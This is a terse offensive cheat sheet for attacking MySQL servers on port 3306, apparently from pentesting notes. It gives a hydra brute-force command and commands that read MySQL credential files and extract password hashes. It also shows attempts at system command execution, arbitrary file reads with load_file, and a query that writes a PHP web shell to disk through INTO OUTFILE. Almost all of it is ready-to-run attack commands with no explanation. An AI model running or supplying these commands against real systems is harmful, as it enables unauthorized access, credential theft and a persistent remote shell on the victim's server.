# MYSQL - 3306

#### Brute force <a href="#brute-force-6" id="brute-force-6"></a>

```
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
```

#### Extracting MySQL credentials from files <a href="#extracting-mysql-credentials-from-files" id="extracting-mysql-credentials-from-files"></a>

```
cat /etc/mysql/debian.cnf
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

#### Connect <a href="#connect" id="connect"></a>

```
# Local
mysql -u <USER>
mysql -u <USER> -p

# Remote
mysql -h <IP> -u <USER>
```

#### MySQL commands <a href="#mysql-commands" id="mysql-commands"></a>

```
show databases;
use <DATABASES>;

show tables;
describe <TABLE>;

select * from <TABLE>;

# Try to execute code
select do_system('id');
\! sh

# Read & Write
select load_file('<FILE>');
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
```

#### Manual exploit <a href="#manual-exploit-1" id="manual-exploit-1"></a>

```
Cheatsheet :
	- https://www.asafety.fr/mysql-injection-cheat-sheet/
```
